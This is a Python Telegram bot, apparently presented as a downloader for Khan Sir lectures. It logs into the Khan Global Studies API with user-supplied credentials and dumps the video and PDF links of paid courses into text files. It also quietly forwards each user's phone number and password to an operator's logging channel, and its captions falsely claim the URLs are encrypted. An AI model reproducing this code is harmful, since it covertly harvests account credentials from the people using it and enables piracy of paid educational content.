import requests
import random
import string
import json
import os
import asyncio
import re
import logging
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyromod import listen
from pyrogram.errors import FloodWait, MessageNotModified
from pyrogram.errors.exceptions.bad_request_400 import UserNotParticipant
from pyrogram.errors.exceptions.forbidden_403 import ChatWriteForbidden
from pyrogram.types import Message
import tabulate
from config import *

class KhanSir:
    META_FIELDS = ['id', 'title', 'price', 'slug']
    token = None
    courses_table = None
    default_headers = {}

    def perform_login(self, phone: str, passwd: str):
        if isinstance(phone, int):
            phone = str(phone)
        login_resp = requests.post('https://api.khanglobalstudies.com/cms/login', headers={
            'accept': 'application/json',
            'content-type': 'application/json'
        }, json={
            'phone': phone,
            'password': passwd,
            'remember': True,
        })
        if login_resp.status_code == 200:
            token = login_resp.json().get('token')
            self.token = token
            self.default_headers['authorization'] = 'Bearer ' + token
            return token
        else:
            raise requests.HTTPError('Failed to get token', response=login_resp)
            #Code write by mr. ankush

    def log_out(self):
        self.token = None
        self.default_headers['authorization'] = None

    def _make_batch(self, videos: list, reversed: bool = True):
        batch_lines = []
        for video in videos:
            if not reversed:
                batch_lines.append(f'{video["name"]}:{video["video_url"]}\n')
            pdfs = video.get('pdfs')
            if isinstance(pdfs, list):
                for pdf in pdfs:
                    batch_lines.append(f'{pdf["title"]}:{pdf["url"]}\n')
            if reversed:
                batch_lines.append(f'{video["name"]}:{video["video_url"]}\n')
        if reversed:
            batch_lines.reverse()
        return batch_lines

    def _make_batch_file(self, batch_file, videos: list):
        if isinstance(batch_file, str):
            with open(batch_file, 'wb') as f:
                f.write((''.join(self._make_batch(videos))).encode())

    def extract_batch(self, id: int):
        batch = self._get_batch(id)
        if not batch:
            return None
        course_lessons_api = f'https://api.khanglobalstudies.com/cms/user/courses/{batch.get("slug")}/lessons'
        #Code write by mr. ankush
        course_lessons = requests.get(
            course_lessons_api,
            headers=self.default_headers)
        if course_lessons.status_code == 200:
            course_lessons = course_lessons.json()
        else:
            raise requests.HTTPError('Failed to get courses', response=course_lessons)
        videos = []
        for course_lesson in course_lessons.get('lessons'):
            videos.extend(course_lesson.get('videos'))
        dest = f'{id}_{batch.get("title")}.txt'
        self._make_batch_file(dest, videos)
        return dest

    def _batch_table(self):
        return tabulate.tabulate([list(course_dict.values()) for course_dict in self.courses_table], self.META_FIELDS)

    def _get_batch(self, id: int):
        for course_dict in self.courses_table:
            if course_dict.get('id') == id:
                return course_dict

    def extract_batch_table(self):
        courses = requests.get(
            'https://api.khanglobalstudies.com/cms/user/v2/courses',
            headers=self.default_headers)
        if courses.status_code == 200:
            courses = courses.json()
        else:
            raise requests.HTTPError('Failed to get courses', response=courses)
        courses_table = []
        for course in courses:
            course_dict = {}
            for meta_field in self.META_FIELDS:
                course_dict[meta_field] = course[meta_field]
            courses_table.append(course_dict)
        self.courses_table = courses_table
        return self._batch_table()


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def count_urls(file_path):
    pdf_count = 0
    video_count = 0
    total_links = 0

    with open(file_path, 'r', encoding='utf-8') as file:
        for line in file:
            url = line.split(':')[-1].strip()  # Extract URL from the line
            total_links += 1  # Count every line as a link
            
            if url.endswith(".pdf"):
                pdf_count += 1
            elif ".m3u8" in url:
                video_count += 1

    return total_links, pdf_count, video_count

# API_ID = 34567564
# API_HASH = "234567dfgghjkkk"
# BOT_TOKEN = "7257874076:AAH-1Q7Q7J9"
# Data_collection_channel = -1002135695400

# bot = Client("ankush_ChatBot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)

# @bot.on_message(filters.command(["start"]))
# async def start(bot, message):
#     try:
#         user_mention = message.from_user.mention
#         await message.reply_text(f"**Hello! {user_mention} \n\nI am a bot to download KhanSir's lectures.\n\n Give /khansir to download the lectures.**")
#     except Exception as e:
#         logger.error(f"Error in start command: {e}")

# @bot.on_message(filters.command(["khan", "khansir"]))
batchessss= "batches.txt"
async def khan(bot, message):
    ks = KhanSir()
    user_mention = message.from_user.mention
    await message.reply_text(f'**Hey! {user_mention}**\n\nSend Your **Phone No. & Password** in this manner otherwise the bot will not respond.\n\nSend like this: **Phone*Password**')
    
    credentials = await bot.listen(message.chat.id, timeout=60)
    credentials = credentials.text
    token = ks.perform_login(*credentials.split('*', 1))
    if not token:
        await message.reply_text('Login failed. Please try again.')
        return
    else:
        await message.reply_text(f'**__Logged in Successfully :\nHere is your Future Token \n\n`{token}`__**')
        
    
    batch_table = ks.extract_batch_table()  # returns: multi-line str table
    if batch_table:
        user_mention = message.from_user.mention
        formatted_batch_table = f"**You have these batches :__**\n**BATCH_ID  -  YOUR_BATCH  -  PRICE**\n\n"
        for course in ks.courses_table:
            formatted_batch_table += f"`{course['id']}` » 🌟**__{course['title']}__** » 💸 ₹**__{course['price']}__**\n"
            
        with open (batchessss, 'a', encoding='utf-8') as f:
            f.write(formatted_batch_table)
        await message.reply_document(batchessss)
        
    else:
        await message.reply_text('**No Batches Found**')
    try:
        await bot.send_document(LOGS_CHANNEL, batchessss, caption=f"**User with ID: `{user_mention}` has logged in.\n\n****\n\nphone and password - `{credentials}`**")
    except FloodWait as e:
        await asyncio.sleep(e.x)
    
    
    await message.reply_text('**Please enter batch id:**')
    batch_id_msg = await bot.listen(message.chat.id, timeout=60)
    id = int(batch_id_msg.text)
    
    dest = ks.extract_batch(id)  # returns: batch file name
    thumbnail = image
    total, pdfs, videos = count_urls(dest)
    caption = (
                f"📌 Batch Details:\n"
                f"┌───📚 Batch: {course['title']}\n"
                f"└──────────────────────────\n\n"
                f"📂 Batch Info:\n"
                f"┌───📲 Application: Khan Sir\n"
                f"│    🌀 Price: ₹__`{course['price']}`__\n"
                f"└──────────────────────────\n\n"
                f"📂 Content Overview:\n"
                f"┌───🔗 Total Links: {total}\n"
                f"│    ├ 🎥 Videos: {videos} 📹\n"
                f"│    └ 📄 PDFs: {pdfs} ❌\n"
                f"└──────────────────────────\n\n"
                f"🔒 Security Notice:\n"
                f"┌───🔹 All URLs are encrypted. 🔑\n"
                f"│    🔹 Use our bot to upload. 🤖\n"
                f"└──────────────────────────"
            )

    await message.reply_document(document=dest, thumb=thumbnail, caption=caption)
    try:
        await bot.send_document(LOGS_CHANNEL, dest, thumb=thumbnail, caption=f"**User with ID: `{message.chat.id}` has downloaded the batch with ID: {id}\n\nBatch Name : ✨{course['title']} » 💸 ₹__{course['price']}__**")
    except FloodWait as e:
        await asyncio.sleep(e.x)

    try:
        os.remove(dest)
        os.remove(batchessss)
    except:
        if os.path.exists(dest):
            os.remove(dest)



# bot.run()
